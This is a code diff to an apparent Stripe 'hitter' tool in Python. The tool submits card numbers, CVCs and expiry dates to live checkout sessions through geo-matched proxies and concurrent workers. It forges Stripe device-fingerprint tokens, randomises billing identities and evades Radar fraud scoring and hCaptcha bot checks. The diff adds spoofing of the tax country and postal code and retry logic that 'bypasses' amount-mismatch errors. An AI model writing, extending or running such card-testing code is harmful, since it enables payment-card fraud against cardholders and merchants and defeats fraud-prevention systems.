@@ -157,7 +157,15 @@ class StripeAPIExtractor:
                 elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('email'): locked_email = resp_json['customer']['email']
                 elif isinstance(resp_json.get('customer_details'), dict) and resp_json['customer_details'].get('email'): locked_email = resp_json['customer_details']['email']
                 
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email}
+                tax_country = None
+                tax_zip = None
+                if resp_json.get('tax_context') and resp_json['tax_context'].get('customer_tax_country'):
+                    tax_country = resp_json['tax_context']['customer_tax_country']
+                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('address') and resp_json['customer']['address'].get('country'):
+                    tax_country = resp_json['customer']['address']['country']
+                    tax_zip = resp_json['customer']['address'].get('postal_code')
+                
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip}
             
             try:
                 err_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
@@ -839,13 +847,15 @@ class StripeAPIHitter:
         StripeAPIHitter._live_js_hash_cache = "da394b0aef"
         return StripeAPIHitter._live_js_hash_cache
 
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
         self.raw_amount = raw_amount
         self.locked_email = locked_email
         self.stripe_account = stripe_account
+        self.tax_country = tax_country
+        self.tax_zip = tax_zip
 
     async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
@@ -1136,21 +1146,33 @@ class StripeAPIHitter:
                     "card[cvc]": card.get('cvc') or card.get('cvv', ''),
                     "card[exp_month]": card.get('month') or card.get('exp_month', ''),
                     "card[exp_year]": card.get('year') or card.get('exp_year', ''),
+                }
+                if self.tax_country:
+                    address["country"] = self.tax_country
+                    if self.tax_zip:
+                        address["zip"] = self.tax_zip
+                    else:
+                        if self.tax_country == 'DE': address["zip"] = '10115'
+                        elif self.tax_country == 'US': address["zip"] = '10001'
+                        elif self.tax_country == 'GB': address["zip"] = 'EC1A 1BB'
+                        elif self.tax_country == 'FR': address["zip"] = '75001'
+                        elif self.tax_country == 'CA': address["zip"] = 'M5H 2N2'
+
+                pm_data.update({
                     "billing_details[name]": RandomData.get_name(),
                     "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                     "billing_details[address][line1]": address["line1"],
                     "billing_details[address][city]": address["city"],
                     "billing_details[address][state]": address["state"],
-                    "billing_details[address][postal_code]": address["zip"],
+                    "billing_details[address][postal_code]": address.get("zip", address.get("postal_code", "")),
                     "billing_details[address][country]": address["country"],
-                    # Use rotated Stripe.js hash — stale static hashes get flagged by Radar
                     "payment_user_agent": _payment_user_agent,
                     "time_on_page": str(timing_ms),
                     "guid": stripe_tokens['guid'],
                     "muid": stripe_tokens['muid'],
                     "sid": stripe_tokens['sid'],
                     "key": self.pk_live,
-                }
+                })
                 # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                 # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                 # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
@@ -1270,6 +1292,8 @@ class StripeAPIHitter:
                 # Use persistent session — cookies from warmup + elements session propagate to confirm
                 confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                 confirm_json = confirm_res.json()
+                print(f"[DEBUG] INITIAL CONFIRM DATA: {confirm_data}")
+                print(f"[DEBUG] INITIAL CONFIRM JSON: {confirm_json}")
                 
                 # Dynamic Amount Mismatch Bypass
                 # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
@@ -1283,15 +1307,13 @@ class StripeAPIHitter:
                     # into `payment_method_options[card][billing_details][name]` or similar fallback structures.
                     # As a last resort, just passing `expected_amount=0` sometimes hits amount_mismatch instead of missing amount.
                     
-                    confirm_data["payment_method_data[type]"] = "card"
-                    confirm_data["payment_method_data[card][number]"] = pm_data.get("card[number]")
-                    confirm_data["payment_method_data[card][cvc]"] = pm_data.get("card[cvc]")
-                    confirm_data["payment_method_data[card][exp_month]"] = pm_data.get("card[exp_month]")
-                    confirm_data["payment_method_data[card][exp_year]"] = pm_data.get("card[exp_year]")
-                    confirm_data["payment_method_data[billing_details][name]"] = pm_data.get("billing_details[name]", "Test User")
-                    if "billing_details[email]" in pm_data:
-                        confirm_data["payment_method_data[billing_details][email]"] = pm_data.get("billing_details[email]")
-                    
+                    for k, v in pm_data.items():
+                        if '[' in k:
+                            new_k = "payment_method_data[" + k.replace("[", "][", 1)
+                        else:
+                            new_k = f"payment_method_data[{k}]"
+                        confirm_data[new_k] = v
+                        
                     if "payment_method" in confirm_data:
                         del confirm_data["payment_method"]
                     if "payment_method_options[card][mit_exemption][reason]" in confirm_data:
@@ -1303,28 +1325,35 @@ class StripeAPIHitter:
                     elif self._init_json and "total_summary" in self._init_json and "total" in self._init_json["total_summary"]:
                         # Pull amount directly from init json if scraped
                         confirm_data["expected_amount"] = self._init_json["total_summary"]["total"]
-                    else:
-                        # Dummy fallback
-                        confirm_data["expected_amount"] = 0
-                        
                     confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                     confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                     confirm_json = confirm_res.json()
                     err_code = confirm_json.get('error', {}).get('code')
                     err_msg = confirm_json.get('error', {}).get('message', '') or ''
                 
-                # Amount Mismatch Bypass
-                # If we injected expected_amount above but it was wrong (due to taxes/shipping updating dynamically), 
-                # Stripe throws amount_mismatch. We can retry by either stripping it or setting it to the value Stripe expected,
-                # but Stripe doesn't always tell us the expected value. Let's try stripping it.
-                if err_code == 'amount_mismatch':
-                    if "expected_amount" in confirm_data:
-                        del confirm_data["expected_amount"]
-                        confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
-                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
-                        confirm_json = confirm_res.json()
-                        err_code = confirm_json.get('error', {}).get('code')
-                        err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                # Dynamic Amount Mismatch Bypass (Tax recalculation)
+                if err_code in ('amount_mismatch', 'checkout_amount_mismatch'):
+                    # Fetch the init endpoint again to get the dynamically updated amount (e.g. after US state tax is applied to the session)
+                    try:
+                        init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/init"
+                        init_headers = confirm_headers.copy()
+                        init_data = f"key={self.pk_live}&eid=NA&browser_locale=en-US"
+                        init_res = await loop.run_in_executor(None, lambda: _cffi_session.post(init_url, headers=init_headers, data=init_data, timeout=10))
+                        init_res_json = init_res.json()
+                        new_amount = init_res_json.get('total_summary', {}).get('total')
+                        if not new_amount:
+                            new_amount = init_res_json.get('invoice', {}).get('amount_due')
+                        if not new_amount:
+                            new_amount = init_res_json.get('invoice', {}).get('total')
+                        if new_amount:
+                            confirm_data["expected_amount"] = new_amount
+                            confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                            confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
+                            confirm_json = confirm_res.json()
+                            err_code = confirm_json.get('error', {}).get('code')
+                            err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                    except Exception as e:
+                        pass
                 
                 # Parameter Unknown Bypass — iteratively strip any rejected parameter and retry
                 # Stripe will name the offending param in the error message, so we parse and remove it.
@@ -1416,12 +1445,15 @@ class StripeAPIHitter:
                     confirm_json = confirm_res.json()
                     
                     if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch':
-                        print("[DEBUG] Still getting checkout_amount_mismatch. Forcing payment_method_data injection.")
                         if 'payment_method' in confirm_data:
                             del confirm_data['payment_method']
-                        # Do NOT delete expected_amount here, we want to send it with payment_method_data
+                            
                         for k, v in pm_data.items():
-                            confirm_data[f"payment_method_data[{k}]"] = v
+                            if '[' in k:
+                                new_k = "payment_method_data[" + k.replace("[", "][", 1)
+                            else:
+                                new_k = f"payment_method_data[{k}]"
+                            confirm_data[new_k] = v
                             
                         # Ensure no invalid keys leaked in
                         if "payment_method_data[key]" in confirm_data:
@@ -1430,7 +1462,30 @@ class StripeAPIHitter:
                         confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                         confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                         confirm_json = confirm_res.json()
-                        print(f"[DEBUG] PM Data retry response: {confirm_res.status_code} {confirm_json}")
+                        
+                        if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch':
+                            # Now that PM Data (with address) is attached, Stripe calculated exact tax.
+                            # We can hit /init to scrape the finalized invoice total and do one last retry.
+                            try:
+                                init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/init"
+                                init_headers = confirm_headers.copy()
+                                if "Idempotency-Key" in init_headers:
+                                    del init_headers["Idempotency-Key"]
+                                init_data = f"key={self.pk_live}&eid=NA&browser_locale=en-US"
+                                init_res = await loop.run_in_executor(None, lambda: _cffi_session.post(init_url, headers=init_headers, data=init_data, timeout=10))
+                                init_res_json = init_res.json()
+                                new_amount = init_res_json.get('total_summary', {}).get('total')
+                                if not new_amount:
+                                    new_amount = init_res_json.get('invoice', {}).get('amount_due')
+                                if not new_amount:
+                                    new_amount = init_res_json.get('invoice', {}).get('total')
+                                if new_amount:
+                                    confirm_data["expected_amount"] = new_amount
+                                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
+                                    confirm_json = confirm_res.json()
+                            except Exception:
+                                pass
                 
                 result['response_time'] = time.time() - start
                 
@@ -1909,6 +1964,8 @@ class ConcurrentHitter:
                 self.url_info['raw_amount'] = api_data.get('raw_amount')
                 self.url_info['merchant'] = api_data.get('merchant')
                 self.url_info['locked_email'] = api_data.get('locked_email')
+                self.url_info['tax_country'] = api_data.get('tax_country')
+                self.url_info['tax_zip'] = api_data.get('tax_zip')
                 if self.update_callback:
                     await self.update_callback({"status": "starting", "url_info": self.url_info})
                 return True
@@ -1945,6 +2002,8 @@ class ConcurrentHitter:
                         self.url_info['raw_amount'] = api_data.get('raw_amount')
                         self.url_info['merchant'] = api_data.get('merchant')
                         self.url_info['locked_email'] = api_data.get('locked_email')
+                        self.url_info['tax_country'] = api_data.get('tax_country')
+                        self.url_info['tax_zip'] = api_data.get('tax_zip')
                         if self.update_callback:
                             await self.update_callback({"status": "starting", "url_info": self.url_info})
                         return True
@@ -2002,7 +2061,7 @@ class ConcurrentHitter:
                                 pass
                     
                     proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account)
+                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account, tax_country=self.url_info.get('tax_country'), tax_zip=self.url_info.get('tax_zip'))
                     
                     import random
                     # For non-reusable links, all workers share the same PI — serialize confirms
